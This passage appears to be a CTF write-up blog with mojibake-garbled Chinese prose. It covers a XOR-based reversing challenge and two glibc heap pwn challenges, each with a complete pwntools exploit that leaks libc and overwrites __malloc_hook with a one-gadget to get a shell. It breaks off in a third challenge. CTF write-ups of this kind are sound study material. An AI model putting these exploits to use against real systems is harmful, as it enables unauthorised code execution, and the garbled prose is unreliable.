<code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æ¯”ã€‚</p><h3 id="sub-12F0-åŠ å¯†å‡½æ•°"><a href="#sub-12F0-åŠ å¯†å‡½æ•°" class="headerlink" title="sub_12F0_åŠ å¯†å‡½æ•°"></a><code>sub_12F0_</code>åŠ å¯†å‡½æ•°</h3><div class="hljs"><pre><code class="hljs python">_BYTE *__fastcall sub_12F0(_BYTE *a1)&#123;  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm &#123; endbr64 &#125;  result = (_BYTE *)sub_1090();  <span class="hljs-keyword">if</span> ( (signed int)result &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - <span class="hljs-number">1</span>);  v4 = <span class="hljs-number">0L</span>L;  do  &#123;    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % <span class="hljs-number">7</span>]) + <span class="hljs-number">65</span>;    v5 = v4++;  &#125;  <span class="hljs-keyword">while</span> ( v3 != v5 );  v6 = <span class="hljs-number">0</span>;  do  &#123;    v7 = a1[<span class="hljs-number">3</span>];    result = a1 + <span class="hljs-number">3</span>;    do    &#123;      v8 = *(result-- - <span class="hljs-number">1</span>);      result[<span class="hljs-number">1</span>] = v8;    &#125;    <span class="hljs-keyword">while</span> ( a1 != result );    v6 += <span class="hljs-number">4</span>;    *a1 = v7;    a1 += <span class="hljs-number">4</span>;  &#125;  <span class="hljs-keyword">while</span> ( v2 &gt; v6 );  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>åŠ¨æ€è°ƒè¯•ï¼Œè¿›è¡Œèµ·æ¥å¾ˆå®¹æ˜“çœ‹æ‡‚ã€‚ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå¯¹è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªä¸<code>byte_4010</code>çš„å­—ç¬¦<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7ç»„æ¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–å’Œ+65ã€‚</p><p>ç„¶åä¸‹é¢ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">while</span> ( v3 != v5 ); v6 = <span class="hljs-number">0</span>; do &#123;   v7 = a1[<span class="hljs-number">3</span>];   result = a1 + <span class="hljs-number">3</span>;   do   &#123;     v8 = *(result-- - <span class="hljs-number">1</span>);     result[<span class="hljs-number">1</span>] = v8;   &#125;   <span class="hljs-keyword">while</span> ( a1 != result );   v6 += <span class="hljs-number">4</span>;   *a1 = v7;   a1 += <span class="hljs-number">4</span>; &#125;</code></pre></div><p>åªçœ‹ç€è®©äººå¤´å¤§ï¼Œè¾“å…¥<code>flag{11111111111111111111111111111111111111111}</code> åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å‘ç°ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>åˆ†æè¿™2ç»„æ•°æ®å°±ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯¹4ä¸ªæ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ã€‚å¤„ç†åç»“æœå°±æ˜¯åŸæ¥çš„ï¼š <code>v1 &gt; v2 &gt; v3 &gt; v4</code> å˜ä¸º <code>v4 &gt; v1 &gt; v2 &gt; v3</code> è¿™æ ·çš„ç»“æœã€‚</p><p>ç„¶åå¤„ç†å®Œå°±ç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚è¿™è‚¯å®šä¸ºä¸€ä¸²å¤„ç†è¿‡çš„å­—ç¬¦ä¸²ï¼Œidaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥æå–æœ‰ç‚¹å®³æ€•æå–é”™ï¼ŒåŠ¨è°ƒæ—¶æå–ä¸€ä¸‹å‡ºæ¥ï¼š</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]</code></pre></div><p>ä¹Ÿå°±æ˜¯è¿™ä¸€æ®µæ•°æ®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>è‡ªå·±ç›´æ¥æ‰‹åŠ¨æ›¿æ¢çš„æ•°æ®ã€‚</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]tag2 = [<span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x5C</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>,<span class="hljs-number">0x5E</span>]qwkey = [<span class="hljs-string">'Q'</span>, <span class="hljs-string">'W'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'s'</span>]flag = <span class="hljs-string">''</span>i = <span class="hljs-number">0</span>j = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tag2)):    <span class="hljs-keyword">if</span> j ==<span class="hljs-number">7</span>:        j = <span class="hljs-number">0</span>    flag += chr((tag2[i] - <span class="hljs-number">65</span>) ^ ord(qwkey[j % <span class="hljs-number">7</span>]))    j += <span class="hljs-number">1</span>print(str(flag))</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>ä¼°è®¡æ²¡æœ‰æå–å…¨ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“flagäº†ã€‚</p><div class="hljs"><pre><code class="hljs python">flag&#123;QWB_water_problem_give_you_the_score&#125;</code></pre></div><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æé†’äº†æ˜¯house of orangeï¼Œé‚£å°±æƒ³ç€è¿™æ ·åˆ©ç”¨å³å¯ã€‚ç°åœ¨house of orangeçš„æ€æƒ³ï¼Œç»ŸæŒ‡ä¸»è¦æ˜¯é’ˆå¯¹æ²¡æœ‰freeçš„å †é¢˜ï¼Œå…¶æ”¹top chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªå¤§ç‚¹çš„chunkï¼Œæ¥è¿›è¡Œè·å–ä¸€ä¸ªè¿›å…¥unsortbin çš„å †å—ã€‚æ²¡æœ‰å¦‚æœ€æ—©çš„å¾ˆç»å…¸çš„åˆ©ç”¨unsortbin attack å’Œ io ç»“åˆæ¥è·å–shellã€‚</p><p>é¢˜ç›®çš„case2 <code>Invite her to go to a movie.</code> ä¸­ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"movie name &gt;&gt; "</span>, &amp;buf);          v4 = atoi((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;buf);          read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(qword_404060[v4] + <span class="hljs-number">0x60</span>), <span class="hljs-number">0x10</span>uLL);</code></pre></div><p>ç”±äºå…¶æ˜¯åœ¨åŠ 0x60ä¹‹åè¯»å–ï¼Œä¸”åœ¨case 1 åªæ˜¯malloc(0x68)ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„å¯ä»¥æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæ”¹å†™åˆ° top chunkã€‚</p><p>å¹¶ä¸”case3ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"You are the apple of my eyes too!"</span>);        qword_404098 = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);        ++v12;</code></pre></div><p>å¯ä»¥ç»™ä½ ç”³è¯·0x1000çš„å †å—ï¼Œè¿™å°±å¯ä»¥å®ç°äº†house of orangeã€‚</p><p>åœ¨case5ä¸­ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>);      read(<span class="hljs-number">0</span>, &amp;key, <span class="hljs-number">8u</span>LL);</code></pre></div><p>ä¼šç»™<code>0x4040A0</code> è¯»ä¸€æ®µæ•°æ®ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>æ˜¯ç´§æŒ¨ç€å †å—çš„ã€‚ç„¶è€Œåœ¨case2ä¸­åœ¨editæ—¶ä¹Ÿæ²¡æœ‰å¯¹å †å—åºå·çš„æ£€æŸ¥,è®©ä¸ªäººè¾“å…¥ä¸ª8 å³å¯å–åˆ°è¿™é‡Œï¼Œè¿›è¡Œç¼–è¾‘ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>house of orangeæ¥è·å–ä¸€ä¸ªunsortbin </li><li>ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä¼šåœ¨è¿™ä¸ªold top chunkä¸­ï¼Œåˆ‡å‡ºä¸€ä¸ªå †å—ï¼Œå…¶ä¸Šä¼šå­˜åœ¨libcçš„ç›¸å…³åœ°å€</li><li>showä¸€ä¸‹ï¼Œæ³„æ¼å‡ºlibc base</li><li>leave <code>__malloc_hook - 0x60</code>çš„åœ°å€åœ¨<code>key</code> å¤„ï¼Œç„¶åè¿›è¡Œç¼–è¾‘è¿™é‡Œçš„æ•°æ®ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./Just_a_Galgame'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add100</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(buf)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    s(str(buf))add()payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0xd41</span>)edit(<span class="hljs-number">0</span>,payload)add100()add()show()ru(<span class="hljs-string">'1: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec2a0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)leave(p64(libc_base + <span class="hljs-number">0x3ebc30</span> - <span class="hljs-number">0x60</span>))one_rec = <span class="hljs-number">0x4f3c2</span> + libc_baseedit(<span class="hljs-number">8</span>,p64(one_rec))add()itr()</code></pre></div><p>è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”èµ›æ—¶ç«Ÿç„¶æ²¡æœ‰çœ‹è¿™ä¸ªé¢˜ã€‚</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</code></pre></div><ul><li><p>ç¦ç”¨äº†fastbinï¼ŒåŸç†å°±æ˜¯ä¿®æ”¹<code>global_max_fast</code> = 0x10</p></li><li><p>å­˜åœ¨off by null</p></li><li><p>æ²¡æœ‰showåŠŸèƒ½</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3></li><li><p>åˆ©ç”¨off by null ï¼Œä¿®æ”¹unsorted bin çš„bkä¸º<code>global_max_fast - 0x10</code></p></li><li><p>åˆ©ç”¨unsorted bin æ”»å‡» <code>global_max_fast</code></p></li><li><p>æ¥ç€fastbin attack æ‰“io fileçš„stdoutï¼Œæ³„æ¼libc</p></li><li><p>æ¥ç€fastbin attackæ‰“ <code>malloc_hook</code> ä¸ºone gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easypwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'39.101.184.181'</span>,<span class="hljs-number">10000</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc-easypwn.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x40</span>)    delete(<span class="hljs-number">0</span>)    <span class="hljs-comment">#null off by one</span>    edit(<span class="hljs-number">1</span>,<span class="hljs-string">'d'</span>*<span class="hljs-number">0x90</span> + p64(<span class="hljs-number">0xa0</span> + <span class="hljs-number">0x40</span>))    delete(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0xe8</span> - <span class="hljs-number">0x30</span>)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0x20</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) +p64(<span class="hljs-number">0</span>)+ p16(<span class="hljs-number">0x57f8</span>- <span class="hljs-number">0x10</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    delete(<span class="hljs-number">2</span>)    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p16(<span class="hljs-number">0x45cf</span>) + <span class="hljs-string">'\n'</span>    edit(<span class="hljs-number">1</span>,payload)    add(<span class="hljs-number">0xe8</span>)    add(<span class="hljs-number">0xe8</span>)    edit(<span class="hljs-number">6</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">0x41</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>) + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./easypwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">143</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)edit(<span class="hljs-number">7</span>,<span class="hljs-string">'\0'</span> * <span class="hljs-number">0xe1</span> + p32(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">'\n'</span>)delete(<span class="hljs-number">2</span>)edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_2_1_stdin_'</span>] + <span class="hljs-number">376</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0xe8</span>)add(<span class="hljs-number">0xe8</span>)rec = libc_addr + <span class="hljs-number">0xf0364</span><span class="hljs-comment"># realloc = libc_addr + libc.symbols['realloc'] + realloc[1]</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0xa0</span> + p64(rec) + p64(rec) + <span class="hljs-string">'\n'</span>edit(<span class="hljs-number">8</span>, payload)info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)add(<span class="hljs-number">0xe8</span>)itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>(name, &amp;s);</code></pre></div><div class="hljs"><pre><code class="hljs c">__isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;age1); <span class="hljs-comment">// é•¿æ•´æ•°</span></code></pre></div><p>å¯èƒ½é€ æˆæº¢å‡ºã€‚åœ¨æ ˆä¸­ï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€ageã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p><p>åœ¨bssæ®µï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€heapå­˜æ”¾çš„åœ°å€ã€‚</p><h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul><li>åªèƒ½ç”³è¯·6ä¸ªå †ã€‚</li><li>ç”³è¯·äº†ä¸€ä¸ªå †ï¼Œå…¶sizeæ”¾åœ¨è·ç¦»å…¶å †åœ°å€Â·<code>6 * 8</code>çš„ä½ç½®ã€‚</li><li>å¯ä»¥æ ¹æ®å †åºå·ç”³è¯·å †ï¼Œåˆ¤æ–­å †åºå·æ˜¯å¦å­˜åœ¨çš„ä¾æ®ï¼šæ­¤å 